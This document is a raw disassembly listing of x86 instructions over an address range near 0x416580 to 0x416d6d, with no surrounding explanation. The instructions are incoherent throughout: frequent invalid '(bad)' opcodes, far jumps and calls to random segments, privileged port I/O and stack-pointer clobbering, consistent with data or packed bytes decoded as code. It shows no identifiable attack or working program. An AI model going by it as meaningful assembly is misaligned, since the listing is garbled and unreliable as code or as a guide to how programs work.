  41657c:	xor    bl,0x7f
  41657f:	call   0x8ec7:0xc5aded72
  416586:	xchg   edx,eax
  416587:	ret    0xc5a1
  41658a:	push   esp
  41658b:	sub    bh,bh
  41658d:	push   eax
  41658e:	shl    esp,0xfc
  416591:	rcl    BYTE PTR [edx-0x1d],1
  416594:	int3   
  416595:	add    al,0x26
  416597:	xchg   edx,eax
  416598:	pop    edi
  416599:	fld    QWORD PTR [edx+0x1e]
  41659c:	xor    al,0xde
  41659e:	or     eax,0xeb2705d8
  4165a3:	dec    edx
  4165a4:	or     DWORD PTR [ecx],ecx
  4165a6:	test   BYTE PTR [ebp+ebx*8-0x1b],dl
  4165aa:	rcl    BYTE PTR [edi-0x46],cl
  4165ad:	pop    ebp
  4165ae:	sub    al,0x87
  4165b0:	and    DWORD PTR [edx+0x65c89694],ebx
  4165b6:	push   esp
  4165b7:	aas    
  4165b8:	clc    
  4165b9:	add    ecx,DWORD PTR [eax+0x2af76329]
  4165bf:	sub    DWORD PTR [ebp-0x78],esp
  4165c2:	imul   esi,DWORD PTR [edi-0x281ea54],0xcd556a6f
  4165cc:	mov    esp,DWORD PTR [edi]
  4165ce:	sub    edi,DWORD PTR [esi+0x24117fab]
  4165d4:	cmc    
  4165d5:	and    eax,0xd0f4bfbd
  4165da:	fisubr DWORD PTR [ebx]
  4165dc:	icebp  
  4165dd:	mov    al,0x32
  4165df:	xor    BYTE PTR [eax],0x2b
  4165e2:	inc    ebx
  4165e3:	cmp    al,0x15
  4165e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165e6:	in     eax,dx
  4165e7:	push   ebx
  4165e8:	adc    dh,BYTE PTR [eax-0x3d]
  4165eb:	xchg   ecx,eax
  4165ec:	cs cmc 
  4165ee:	pop    edx
  4165ef:	lock sti 
  4165f1:	and    al,0xb6
  4165f3:	pop    ebp
  4165f4:	sub    esi,DWORD PTR [ebx+0x1a]
  4165f7:	inc    esi
  4165f8:	or     bl,al
  4165fa:	jo     0x41663a
  4165fc:	loopne 0x41666a
  4165fe:	inc    ebp
  4165ff:	popa   
  416600:	mov    WORD PTR ss:[ebx+0x3164cf4d],?
  416607:	lods   al,BYTE PTR ds:[esi]
  416608:	js     0x4165c0
  41660a:	es inc ebp
  41660c:	add    BYTE PTR [ebx-0x27b3882a],dl
  416612:	add    ebx,DWORD PTR [ebp-0x4a]
  416615:	jns    0x416651
  416617:	sub    DWORD PTR [ebp-0x2c],ebx
  41661a:	or     al,dh
  41661c:	xlat   BYTE PTR ds:[ebx]
  41661d:	sahf   
  41661e:	sub    edx,edi
  416620:	(bad)  ds:0x836f0b9a
  416626:	ja     0x4166a4
  416628:	gs dec ebp
  41662a:	or     BYTE PTR [ecx-0x41],ch
  41662d:	jp     0x4166a3
  41662f:	fbstp  TBYTE PTR [ecx]
  416631:	mov    ebx,0xb9b48cef
  416636:	test   eax,0xab027187
  41663b:	aad    0xbe
  41663d:	jno    0x41663c
  41663f:	clc    
  416640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416641:	cmc    
  416642:	jge    0x41663b
  416644:	jecxz  0x41668b
  416646:	rol    BYTE PTR [ecx+0xf91193e],1
  41664c:	test   BYTE PTR ds:0xf7c1bdae,bh
  416652:	sbb    al,0x4b
  416654:	mov    esi,0xaef0609
  416659:	dec    eax
  41665a:	jmp    0xc6f777e6
  41665f:	push   ebx
  416660:	fwait
  416661:	(bad)  
  416662:	(bad)  
  416663:	add    BYTE PTR [ebx-0x4d74ac5a],0xc2
  41666a:	pop    ebp
  41666b:	mov    dh,0x46
  41666d:	xchg   BYTE PTR [ecx-0x21],ah
  416670:	fmul   DWORD PTR [edx]
  416672:	stos   DWORD PTR es:[edi],eax
  416673:	icebp  
  416674:	int3   
  416675:	enter  0x6f7f,0xee
  416679:	jle    0x4165ff
  41667b:	sub    ah,BYTE PTR [ebx]
  41667d:	imul   ebp,DWORD PTR [eax],0x226d4d32
  416683:	loop   0x4166e5
  416685:	mov    bh,0xfd
  416687:	jl     0x416703
  416689:	in     eax,0x79
  41668b:	addr16 adc al,0x4d
  41668e:	(bad)  
  41668f:	pop    edi
  416690:	rcl    DWORD PTR [ecx-0x8372aa3],1
  416696:	mov    al,0xd3
  416698:	jmp    0xba34:0x21cc8870
  41669f:	sbb    BYTE PTR [eax+0x45],bl
  4166a2:	xor    BYTE PTR [eax],0x4c
  4166a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166a6:	(bad)  
  4166a7:	jl     0x416662
  4166a9:	neg    BYTE PTR [edi+0x4]
  4166ac:	scas   eax,DWORD PTR es:[di]
  4166ae:	jmp    0x4166b4
  4166b0:	xchg   ebp,ebx
  4166b2:	fidiv  DWORD PTR [ebx-0x237518d8]
  4166b8:	pop    esp
  4166b9:	pop    edi
  4166ba:	ret    0x7f9b
  4166bd:	mov    al,0xfc
  4166bf:	sbb    bl,al
  4166c1:	sub    al,0x9e
  4166c3:	jno    0x416716
  4166c5:	shl    al,1
  4166c7:	ss pop ebp
  4166c9:	jg     0x41672b
  4166cb:	aas    
  4166cc:	add    al,0xe8
  4166ce:	add    BYTE PTR [edx-0x5],ch
  4166d1:	addr16 sub esp,eax
  4166d4:	inc    ebp
  4166d5:	lahf   
  4166d6:	jmp    0x4166bd
  4166d8:	lods   al,BYTE PTR ds:[esi]
  4166d9:	repz neg dl
  4166dc:	std    
  4166dd:	hlt    
  4166de:	mov    bh,0xd8
  4166e0:	xacquire xchg DWORD PTR [eax],ebp
  4166e3:	jle    0x416700
  4166e5:	add    BYTE PTR [ecx+0x172cde07],ah
  4166eb:	push   0x2224d1f7
  4166f0:	repz push ebx
  4166f2:	mov    eax,0x1a6eaaa1
  4166f7:	popa   
  4166f8:	xchg   edx,eax
  4166f9:	iret   
  4166fa:	pop    ecx
  4166fb:	dec    ebp
  4166fc:	sub    esi,DWORD PTR [eax]
  4166fe:	(bad)  
  4166ff:	cli    
  416700:	lods   eax,DWORD PTR ds:[esi]
  416701:	jle    0x41676f
  416703:	es test al,0x75
  416706:	(bad)
  416709:	repnz ror bh,cl
  41670c:	in     al,dx
  41670d:	push   esi
  41670e:	sub    al,0xf
  416710:	mov    al,0x97
  416712:	sbb    edi,DWORD PTR [ecx]
  416714:	or     DWORD PTR [edx+0x7bb9be5b],edx
  41671a:	cmp    edx,DWORD PTR [edx]
  41671c:	out    dx,al
  41671d:	xchg   edx,eax
  41671e:	xchg   ebx,eax
  41671f:	mov    eax,0x366497a0
  416724:	loop   0x41672a
  416726:	push   ecx
  416727:	out    0x73,al
  416729:	mov    eax,ds:0x1c2b4fde
  41672e:	pop    ss
  41672f:	leave  
  416730:	mov    ch,0xd7
  416732:	fnsave [eax+0x685ee240]
  416738:	mov    ds:0xde370c01,eax
  41673d:	sub    al,0x9b
  41673f:	mov    al,0xac
  416741:	ins    DWORD PTR es:[edi],dx
  416742:	imul   eax,DWORD PTR [eax],0xffffff8e
  416745:	jae    0x416750
  416747:	sub    BYTE PTR [edx],bh
  416749:	outs   dx,BYTE PTR ds:[esi]
  41674a:	mov    esi,0xae7a1e1d
  41674f:	(bad)  
  416751:	mov    al,0x3
  416753:	jnp    0x41670b
  416755:	dec    ecx
  416756:	adc    al,0xd6
  416758:	pop    esi
  416759:	push   ds
  41675a:	add    BYTE PTR ds:0xe2bd0bbe,0x8
  416761:	loope  0x416717
  416763:	ss inc edi
  416765:	loopne 0x41672d
  416767:	dec    ecx
  416768:	pop    ds
  416769:	cmp    ch,BYTE PTR [edx+edi*2]
  41676c:	fwait
  41676d:	pushf  
  41676e:	mov    ds:0xa42aef64,eax
  416773:	int    0xc8
  416775:	mov    BYTE PTR [esi+0x31],cl
  416778:	or     al,0xc
  41677a:	and    eax,0x4a55f5fe
  41677f:	mov    bh,0xfe
  416781:	mov    eax,0x61fca6e4
  416786:	or     eax,0xb402580f
  41678b:	push   eax
  41678c:	pop    edx
  41678d:	mov    eax,DWORD PTR [edx+esi*1]
  416790:	(bad)  
  416791:	out    0xb7,eax
  416793:	loop   0x416814
  416795:	call   0x237959e2
  41679a:	sbb    DWORD PTR [ebp-0x2cd1b891],ebx
  4167a0:	inc    eax
  4167a1:	sub    BYTE PTR [eax-0x1f97c95a],dh
  4167a7:	push   esp
  4167a8:	sub    DWORD PTR [edx-0x4d],esi
  4167ab:	mov    dl,0xab
  4167ad:	(bad)  
  4167ae:	clc    
  4167af:	and    ebp,eax
  4167b1:	int    0x0
  4167b3:	enter  0x8cc5,0x46
  4167b7:	xchg   ecx,eax
  4167b8:	xor    eax,0x15832d27
  4167bd:	stos   DWORD PTR es:[edi],eax
  4167be:	scas   eax,DWORD PTR es:[edi]
  4167bf:	popf   
  4167c0:	int    0xcf
  4167c2:	or     al,0xb
  4167c4:	cmp    BYTE PTR [esi+0x5537fc64],bl
  4167ca:	jle    0x4167ac
  4167cc:	mov    dh,0xb0
  4167ce:	pop    edx
  4167cf:	dec    ecx
  4167d0:	daa    
  4167d1:	xor    DWORD PTR [edx+0x38],0xc1aad5e3
  4167d8:	push   cs
  4167d9:	fild   QWORD PTR [eax]
  4167db:	sbb    DWORD PTR [esi+0x9],0x66
  4167df:	add    ebp,DWORD PTR [ebx-0x4e87b32]
  4167e5:	fisttp WORD PTR [eax]
  4167e7:	cmp    BYTE PTR [ecx+0x67],al
  4167ea:	jmp    0xd576654
  4167ef:	stos   DWORD PTR es:[edi],eax
  4167f0:	mov    bl,0x67
  4167f2:	shl    cl,0xe4
  4167f5:	mov    DWORD PTR es:[esi+0x1168533f],0xb3e14250
  416800:	fst    DWORD PTR [edi-0x14]
  416803:	inc    edx
  416804:	xor    ch,ah
  416806:	dec    esp
  416807:	popa   
  416808:	mov    edx,DWORD PTR ss:[ebx]
  41680b:	sub    eax,0x8a9309d4
  416810:	inc    ebp
  416811:	cdq    
  416812:	sub    al,0x37
  416814:	test   bl,ah
  416816:	jle    0x4167f5
  416818:	pop    ebp
  416819:	inc    esp
  41681a:	imul   edi,edi,0xffffff9b
  41681d:	xor    BYTE PTR [ecx+0x64b49a43],0xc8
  416824:	xchg   edx,eax
  416825:	jmp    0x85539260
  41682a:	push   0x4443648a
  41682f:	(bad)  
  416830:	lahf   
  416831:	and    ch,BYTE PTR [di]
  416834:	xchg   ebx,eax
  416835:	push   edx
  416836:	add    DWORD PTR [eax],ecx
  416838:	pusha  
  416839:	dec    ebp
  41683a:	dec    esi
  41683b:	jp     0x4167c9
  41683d:	add    al,0x9d
  41683f:	push   edx
  416840:	xor    esp,DWORD PTR [ecx+0x5f]
  416843:	pop    ebx
  416844:	cmovnp ebx,DWORD PTR [edx-0x11]
  416848:	gs sbb al,0xbf
  41684b:	pop    ecx
  41684c:	inc    eax
  41684d:	and    DWORD PTR [esi],eax
  41684f:	mov    edi,0x741ab0b4
  416854:	jo     0x4167de
  416856:	fcomp  QWORD PTR [esi+0x2327c8d]
  41685c:	and    edi,ebx
  41685e:	je     0x4168a5
  416860:	sbb    BYTE PTR [edx-0x32],cl
  416863:	jmp    0x4168bd
  416865:	pusha  
  416866:	inc    esp
  416867:	adc    ch,dh
  416869:	dec    ebx
  41686a:	jmp    0x782f:0x59e6991b
  416871:	arpl   ax,si
  416873:	lahf   
  416874:	(bad)  
  416875:	sbb    esi,edx
  416877:	clc    
  416878:	popa   
  416879:	(bad)  
  41687a:	dec    eax
  41687b:	adc    ecx,ebp
  41687d:	adc    al,0x9f
  41687f:	or     ebp,DWORD PTR [edi+esi*1+0x3ca20ffa]
  416886:	or     esp,DWORD PTR [eax-0x6e]
  416889:	add    bh,dh
  41688b:	jbe    0x4168db
  41688d:	rcl    DWORD PTR [ecx],cl
  41688f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416890:	inc    esp
  416891:	in     al,dx
  416892:	adc    cl,al
  416894:	shl    dl,0x8b
  416897:	(bad)  
  416898:	scas   eax,DWORD PTR es:[edi]
  416899:	push   0x24536a0b
  41689e:	pop    edi
  41689f:	cld    
  4168a0:	sbb    bl,BYTE PTR [ecx]
  4168a2:	adc    BYTE PTR [edi-0x72],bh
  4168a5:	fistp  WORD PTR [edi-0x22]
  4168a8:	sar    esp,cl
  4168aa:	ds popf 
  4168ac:	(bad)  
  4168ad:	repnz pop ebx
  4168af:	lahf   
  4168b0:	hlt    
  4168b1:	adc    edi,ebp
  4168b3:	mov    cl,0xe2
  4168b5:	mov    DWORD PTR [ecx],edi
  4168b7:	cmp    ah,BYTE PTR [ecx+0x68]
  4168ba:	les    ebx,FWORD PTR ss:[ebp-0x5a]
  4168be:	adc    eax,0xf6c0c9f7
  4168c3:	inc    edx
  4168c4:	bound  edx,QWORD PTR [ebp+0x5fe8fa4c]
  4168ca:	idiv   DWORD PTR [esi]
  4168cc:	lahf   
  4168cd:	call   0x2c43:0x78327c20
  4168d4:	xor    edi,edi
  4168d6:	xchg   ecx,eax
  4168d7:	call   0x1b3d:0xdae1ba24
  4168de:	adc    DWORD PTR [edx+0x4978baa6],0x3d
  4168e5:	enter  0x43c0,0xaa
  4168e9:	or     DWORD PTR [esi+edi*4-0x34d89b01],edi
  4168f0:	sub    BYTE PTR [ebx+ebp*4-0xe],ah
  4168f4:	shr    BYTE PTR [eax-0x75],cl
  4168f7:	add    DWORD PTR [ecx-0x14],ecx
  4168fa:	popa   
  4168fb:	(bad)  
  4168fc:	xor    edx,edi
  4168fe:	ss dec eax
  416900:	mov    cl,BYTE PTR [ebx+0x5e]
  416903:	xchg   esi,eax
  416904:	sti    
  416905:	inc    esp
  416906:	add    ebx,DWORD PTR [ebp+0x3b]
  416909:	jno    0x416980
  41690b:	loop   0x4168b5
  41690d:	add    BYTE PTR [eax],0x19
  416910:	lock sub bh,BYTE PTR [ebx+ecx*1-0x6709f194]
  416918:	lds    edx,FWORD PTR [esi-0x611d2281]
  41691e:	jae    0x41695a
  416920:	jmp    0xa0a18e8a
  416925:	adc    BYTE PTR [edi-0x6e],bl
  416928:	mov    bh,0xed
  41692a:	cli    
  41692b:	and    eax,0x61eb0f34
  416930:	ror    BYTE PTR [edi+0x24838207],1
  416936:	dec    edx
  416937:	mov    dl,0x9a
  416939:	fisubr WORD PTR [esi-0x37b62a1f]
  41693f:	add    BYTE PTR [ebx+0x31087aa7],ch
  416945:	repz xor eax,0x6e432bd8
  41694b:	pop    es
  41694c:	xlat   BYTE PTR ds:[ebx]
  41694d:	(bad)  
  41694e:	xchg   ebp,eax
  41694f:	dec    ebx
  416950:	call   0xd12e:0xd8b0d226
  416957:	xchg   BYTE PTR ds:0xf166caa1,bl
  41695d:	hlt    
  41695e:	enter  0x52ef,0x44
  416962:	loopne 0x4169c5
  416964:	mov    ah,0x5b
  416966:	xor    eax,0x81aa14f3
  41696b:	mov    ebp,0x9c1b82f1
  416970:	or     BYTE PTR [esi],ah
  416972:	mov    eax,0x6a231f75
  416977:	gs dec ebp
  416979:	aas    
  41697a:	mov    eax,0x8405da87
  41697f:	push   0x49
  416981:	inc    eax
  416982:	sub    ebp,DWORD PTR [edi]
  416984:	mov    ds:0x273dd0e,al
  416989:	fcmovbe st,st(5)
  41698b:	mov    dl,0x38
  41698d:	cld    
  41698e:	mov    dh,BYTE PTR [eax+eiz*8]
  416991:	lea    edi,[ebp+0x442ffd98]
  416997:	out    dx,al
  416998:	cmc    
  416999:	stc    
  41699a:	jecxz  0x416947
  41699c:	inc    ecx
  41699d:	mov    edx,0x59acf56b
  4169a2:	and    eax,0x2b2b6515
  4169a7:	js     0x4169df
  4169a9:	mov    ebp,0x52512004
  4169ae:	mov    ebp,DWORD PTR [ebp+0x54]
  4169b1:	pop    eax
  4169b2:	xchg   esp,eax
  4169b3:	fld    TBYTE PTR [edi-0x2b]
  4169b6:	mov    ds:0xc7c49b6d,al
  4169bb:	or     bh,dl
  4169bd:	mov    al,ds:0x25feac82
  4169c2:	aam    0x71
  4169c4:	sub    dh,dl
  4169c6:	es jne 0x4169fa
  4169c9:	push   ax
  4169cb:	call   0xf554:0xc627f1f5
  4169d2:	(bad)  
  4169d3:	sub    ebx,esp
  4169d5:	pop    ds
  4169d6:	les    eax,FWORD PTR [esi-0x31cdf5dc]
  4169dc:	xchg   esi,eax
  4169dd:	mov    cl,0xea
  4169df:	mov    BYTE PTR [ebx+0x2a],ah
  4169e2:	add    eax,0x150e99c9
  4169e7:	stos   BYTE PTR es:[edi],al
  4169e8:	adc    al,0xe6
  4169ea:	or     dh,BYTE PTR [eax+0x7af60a1d]
  4169f0:	repnz or BYTE PTR [eax+0x710314d4],ch
  4169f7:	rcr    BYTE PTR [esp+eax*8+0x69df73c3],cl
  4169fe:	rcr    DWORD PTR [ebx+0x1c0e5628],cl
  416a04:	imul   esi,eax,0xffffffc9
  416a07:	inc    ecx
  416a08:	fucomip st,st(7)
  416a0a:	mov    ds:0xa3750c04,al
  416a0f:	repnz mov ch,0xcf
  416a12:	lahf   
  416a13:	mov    dh,0x27
  416a15:	push   cs
  416a16:	push   ebp
  416a17:	mov    ds:0x6bf9eaff,al
  416a1c:	mov    bh,0x4b
  416a1e:	xchg   ebp,eax
  416a1f:	mov    esp,0xe5084779
  416a24:	inc    edx
  416a25:	lahf   
  416a26:	mov    ds:0xcf85e57b,al
  416a2b:	mov    eax,DWORD PTR [edi]
  416a2d:	and    BYTE PTR [ebp-0x77],bl
  416a30:	retf   
  416a31:	and    al,0x87
  416a33:	jno    0x4169e9
  416a35:	push   cs
  416a36:	mov    ecx,0x3fb7e93b
  416a3b:	ds ins BYTE PTR es:[edi],dx
  416a3d:	fisttp DWORD PTR [ecx]
  416a3f:	fimul  DWORD PTR [ebx+edx*4]
  416a42:	dec    esp
  416a43:	fwait
  416a44:	cmp    DWORD PTR [edx+0x59fbc010],ebp
  416a4a:	mov    esi,0x5a529b33
  416a4f:	and    DWORD PTR [eax+ecx*8],edi
  416a52:	push   eax
  416a53:	stc    
  416a54:	(bad)  
  416a55:	imul   BYTE PTR [ebx+0x42]
  416a58:	in     al,0x22
  416a5a:	pop    edx
  416a5b:	stos   DWORD PTR es:[edi],eax
  416a5c:	or     BYTE PTR [edx+0x15467fc],ch
  416a62:	scas   al,BYTE PTR es:[edi]
  416a63:	in     al,0xb
  416a65:	jmp    0x8286caeb
  416a6a:	(bad)  
  416a6c:	mov    DWORD PTR es:[eax-0x1f77c010],ebp
  416a73:	cmp    ah,BYTE PTR [esi]
  416a75:	xchg   ebx,eax
  416a76:	mov    DWORD PTR ds:0xaaee85db,ebx
  416a7c:	cdq    
  416a7d:	xchg   ebx,eax
  416a7e:	outs   dx,BYTE PTR ds:[esi]
  416a7f:	rcr    DWORD PTR [ebp+0x320b2a53],0x4d
  416a86:	fdivr  DWORD PTR [eax+0x36558c69]
  416a8c:	fisubr DWORD PTR [edx+0x5c]
  416a8f:	add    eax,0xcef7659a
  416a94:	repnz call 0xbbe:0x6890a5ec
  416a9c:	add    edi,ebp
  416a9e:	adc    esi,DWORD PTR [esi-0x1a]
  416aa1:	repnz pop ss
  416aa3:	call   0xc292c37f
  416aa8:	xor    eax,0x976578e
  416aad:	popa   
  416aae:	and    al,0x0
  416ab0:	bound  edx,QWORD PTR [edx]
  416ab2:	and    eax,0x3367c2aa
  416ab7:	or     cl,cl
  416ab9:	lds    eax,FWORD PTR [ebx+0x69]
  416abc:	jecxz  0x416a91
  416abe:	test   al,ch
  416ac0:	addr16 hlt 
  416ac2:	gs nop
  416ac4:	call   DWORD PTR [ecx-0x34]
  416ac7:	dec    edi
  416ac8:	cmp    esp,DWORD PTR [edx]
  416aca:	inc    ebx
  416acb:	rol    esp,1
  416acd:	mov    edi,0x227a38f2
  416ad2:	add    al,0xca
  416ad4:	and    DWORD PTR [ebx-0x7b],0xffffff90
  416ad8:	sbb    eax,0x8e68d0bf
  416add:	jl     0x416aa1
  416adf:	es sub dl,cl
  416ae2:	fild   DWORD PTR [ebx+0x6ed27c69]
  416ae8:	jne    0x416a91
  416aea:	js     0x416aaa
  416aec:	and    esi,edx
  416aee:	mov    al,0xe2
  416af0:	mov    ebp,0xe847bee7
  416af5:	adc    ax,0xdd15
  416af9:	fnstenv [esp+edi*1+0x6f4fbff4]
  416b00:	cmp    esi,DWORD PTR [ebx+edi*2]
  416b03:	es dec ecx
  416b05:	mov    ecx,0xda78045d
  416b0a:	inc    ecx
  416b0b:	sbb    ch,cl
  416b0d:	in     al,dx
  416b0e:	mov    dh,0x6f
  416b10:	sahf   
  416b11:	loopne 0x416b69
  416b13:	or     bh,BYTE PTR [edx+0x1d]
  416b16:	adc    cl,BYTE PTR [eax+0x6a]
  416b19:	les    ecx,FWORD PTR [ecx]
  416b1b:	out    dx,eax
  416b1c:	lahf   
  416b1d:	pop    eax
  416b1e:	(bad)  
  416b20:	jmp    0x416b20
  416b22:	pop    ebx
  416b23:	dec    ecx
  416b24:	je     0x416ad3
  416b26:	outs   dx,BYTE PTR cs:[esi]
  416b28:	xor    esp,DWORD PTR [eax]
  416b2a:	inc    ebx
  416b2b:	mov    dl,0xf4
  416b2d:	scas   al,BYTE PTR es:[edi]
  416b2e:	int    0x7a
  416b30:	jb     0x416aff
  416b32:	test   eax,0x736d6be1
  416b37:	mov    bh,0x94
  416b39:	mov    al,0x7e
  416b3b:	fild   DWORD PTR [esi]
  416b3d:	fimul  WORD PTR ds:0x39129adc
  416b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b44:	loope  0x416ad1
  416b46:	mov    ah,BYTE PTR [ecx+0x4e49a45]
  416b4c:	cmp    dh,bl
  416b4e:	ss pop ebp
  416b50:	jmp    0x9bd71de
  416b55:	loopne 0x416b7a
  416b57:	out    0xa,al
  416b59:	es cli 
  416b5b:	jle    0x416af3
  416b5d:	data16 das 
  416b5f:	dec    ebp
  416b60:	iret   
  416b61:	js     0x416b7c
  416b63:	add    eax,0x503e42db
  416b68:	cld    
  416b69:	inc    DWORD PTR [ebp+0x3cd7dc55]
  416b6f:	in     al,dx
  416b70:	xchg   ecx,eax
  416b71:	dec    edx
  416b72:	jns    0x416b60
  416b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b75:	jo     0x416b7c
  416b77:	fild   WORD PTR [esi+0x56]
  416b7a:	push   es
  416b7b:	sbb    ecx,DWORD PTR [ebx]
  416b7d:	lods   eax,DWORD PTR ds:[esi]
  416b7e:	js     0x416bc3
  416b80:	mov    ecx,eax
  416b82:	cmp    al,0x1b
  416b84:	imul   BYTE PTR [eax]
  416b86:	jge    0x416b2d
  416b88:	and    ebx,DWORD PTR [eax+0xe]
  416b8b:	or     edi,DWORD PTR ds:0x43e0da53
  416b91:	jae    0x416b67
  416b93:	stos   DWORD PTR es:[edi],eax
  416b94:	mov    bl,ah
  416b96:	and    eax,DWORD PTR es:[ecx-0x55]
  416b9a:	sbb    ecx,DWORD PTR [edx+0x57]
  416b9d:	div    eax
  416b9f:	jb     0x416bb6
  416ba1:	mov    esp,0xc3c44813
  416ba6:	aam    0x29
  416ba8:	div    BYTE PTR [ebx+0xc]
  416bab:	or     eax,0x4e017be2
  416bb0:	add    eax,0xbddeb9ae
  416bb5:	mov    ah,dh
  416bb7:	pop    eax
  416bb8:	ss jg  0x416c2d
  416bbb:	stc    
  416bbc:	clc    
  416bbd:	mov    ebp,0x28980b15
  416bc2:	outs   dx,DWORD PTR ds:[esi]
  416bc3:	mov    ecx,ecx
  416bc5:	lods   al,BYTE PTR ds:[esi]
  416bc6:	loope  0x416bef
  416bc8:	in     eax,0x5b
  416bca:	cwde   
  416bcb:	and    dl,BYTE PTR ds:0xff7b76bd
  416bd1:	hlt    
  416bd2:	lahf   
  416bd3:	and    BYTE PTR [edx-0x35],cl
  416bd6:	or     ch,BYTE PTR [esi]
  416bd8:	call   0xa0f3ac7c
  416bdd:	test   al,0x67
  416bdf:	jmp    0xca0be0e2
  416be4:	call   0xdc5bf4ab
  416be9:	cs and al,0xac
  416bec:	leave  
  416bed:	mov    ecx,0x7ebe304f
  416bf2:	pop    esi
  416bf3:	(bad)  [eax+0x3d]
  416bf6:	pop    esp
  416bf7:	(bad)  
  416bf8:	imul   ebx,DWORD PTR ds:0x7847a817,0x5c
  416bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c00:	out    0x28,al
  416c02:	adc    esp,ebx
  416c04:	push   ebx
  416c05:	aam    0xf7
  416c07:	lea    esi,[esi-0x3]
  416c0a:	inc    esp
  416c0b:	pop    ds
  416c0c:	aaa    
  416c0d:	mov    bl,0x6a
  416c0f:	out    dx,al
  416c10:	fistp  WORD PTR [edi+0xb]
  416c13:	outs   dx,DWORD PTR ds:[esi]
  416c14:	cmovb  ebx,DWORD PTR [ecx+0x494f06a4]
  416c1b:	aaa    
  416c1c:	scas   eax,DWORD PTR es:[edi]
  416c1d:	daa    
  416c1e:	add    BYTE PTR [esi+ebp*8],0x65
  416c22:	sbb    DWORD PTR [edx+ebx*4-0x2ae80ee1],edx
  416c29:	das    
  416c2a:	test   BYTE PTR [esi],ah
  416c2c:	rcr    DWORD PTR [ebp+eiz*1+0x26c401d8],cl
  416c33:	fs out 0xa4,eax
  416c36:	dec    edx
  416c37:	or     esp,DWORD PTR ds:0x4ae6bcb7
  416c3d:	cmp    eax,0x3552caf4
  416c42:	add    BYTE PTR [ebx+0x51edb415],dl
  416c48:	in     al,dx
  416c49:	add    BYTE PTR [ebx+0x3cfc2764],bl
  416c4f:	test   BYTE PTR [edx],ah
  416c51:	jne    0x416bfb
  416c53:	add    esp,edx
  416c55:	jl     0x416c0f
  416c57:	ficom  WORD PTR ds:0xac4844a4
  416c5d:	shl    DWORD PTR [ecx+0x5ede7b8e],0x2b
  416c64:	jo     0x416cbf
  416c66:	dec    eax
  416c67:	or     bl,BYTE PTR fs:[ebx*8+0x1fca451d]
  416c6f:	ror    esp,1
  416c71:	jle    0x416c6a
  416c73:	test   BYTE PTR [ebx+0x5bc1457f],dl
  416c79:	sar    BYTE PTR [edx],1
  416c7b:	xlat   BYTE PTR ds:[ebx]
  416c7c:	aas    
  416c7d:	add    eax,0x3d958dab
  416c82:	lods   al,BYTE PTR ds:[esi]
  416c83:	xor    eax,0xaa11a19c
  416c88:	mov    ds:0x6fb3916c,eax
  416c8d:	inc    ch
  416c8f:	dec    edx
  416c90:	inc    edx
  416c91:	dec    ebp
  416c92:	dec    edi
  416c93:	ds jle 0x416cde
  416c96:	dec    esp
  416c97:	fidiv  DWORD PTR [edx+0x7e]
  416c9a:	inc    esi
  416c9b:	pop    edi
  416c9c:	shl    al,0xb4
  416c9f:	xchg   DWORD PTR [ecx+ebp*4+0x57],esp
  416ca3:	sar    DWORD PTR [esi],0x5a
  416ca6:	xlat   BYTE PTR ds:[ebx]
  416ca7:	sahf   
  416ca8:	retf   0x2a6c
  416cab:	test   al,0x36
  416cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cae:	mov    BYTE PTR [edi-0x61],bl
  416cb1:	xchg   BYTE PTR [eax-0x3f6c908d],dl
  416cb7:	adc    DWORD PTR [esi],ebx
  416cb9:	jmp    0x416c84
  416cbb:	test   DWORD PTR ds:0x439e3365,esp
  416cc1:	popf   
  416cc2:	sub    DWORD PTR [ecx+0x1e],0x8f81dd28
  416cc9:	neg    DWORD PTR [ecx-0x5d]
  416ccc:	xchg   DWORD PTR [esi+edx*4+0x25],esi
  416cd0:	mov    ah,0xd7
  416cd2:	pop    esi
  416cd3:	data16 ror BYTE PTR [ebx],0xa6
  416cd7:	push   ss
  416cd8:	shl    DWORD PTR [ecx],1
  416cda:	scas   eax,DWORD PTR es:[edi]
  416cdb:	call   0x2f01:0x65cbdf
  416ce2:	sub    dh,ah
  416ce4:	mov    ecx,0xe0cad36a
  416ce9:	add    al,0xfb
  416ceb:	dec    sp
  416ced:	jmp    0x416cf6
  416cef:	and    bh,BYTE PTR [esi]
  416cf1:	jecxz  0x416d08
  416cf3:	and    dh,BYTE PTR [edx-0x1b]
  416cf6:	gs dec edi
  416cf8:	stos   BYTE PTR es:[edi],al
  416cf9:	pop    es
  416cfa:	sub    al,0x9a
  416cfc:	push   0x3d
  416cfe:	push   edi
  416cff:	sbb    ebx,DWORD PTR [ebx+0x9]
  416d02:	sub    al,0x81
  416d04:	pop    esp
  416d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d06:	mov    bh,0x47
  416d08:	inc    edi
  416d09:	jmp    0x845e:0x9fa81bff
  416d10:	fdiv   st,st(2)
  416d12:	loope  0x416d66
  416d14:	popf   
  416d15:	in     eax,0x85
  416d17:	sbb    DWORD PTR [eax-0x7e858a92],ebp
  416d1d:	test   al,0xf2
  416d1f:	sub    al,0x64
  416d21:	jmp    0xdd99f09d
  416d26:	les    ebp,FWORD PTR [edx+ecx*4-0x45be2695]
  416d2d:	dec    esi
  416d2e:	mov    esi,0x74c87d5b
  416d33:	fistp  DWORD PTR ds:[ecx+0x49]
  416d37:	mov    es,eax
  416d39:	add    eax,0x3ba9012b
  416d3e:	je     0x416d4a
  416d40:	sar    BYTE PTR [edi],cl
  416d42:	mov    bh,0xa4
  416d44:	dec    esi
  416d45:	je     0x416d59
  416d47:	imul   edx,edx,0xc7bf975e
  416d4d:	addr16 pop edx
  416d4f:	les    ebp,FWORD PTR ds:0xb043d05
  416d55:	xchg   edx,eax
  416d56:	sbb    bh,BYTE PTR [edi-0x6ac58acd]
  416d5c:	ret    0xef34
  416d5f:	outs   dx,BYTE PTR ds:[esi]
  416d60:	pushf  
  416d61:	cmp    al,0x5b
  416d63:	ja     0x416d23
  416d65:	push   es
  416d66:	and    bh,cl
  416d68:	ja     0x416d5e
  416d6a:	cmovno ebp,DWORD PTR [ebx]
  416d6d:	scas   al,BYTE PTR es:[edi]
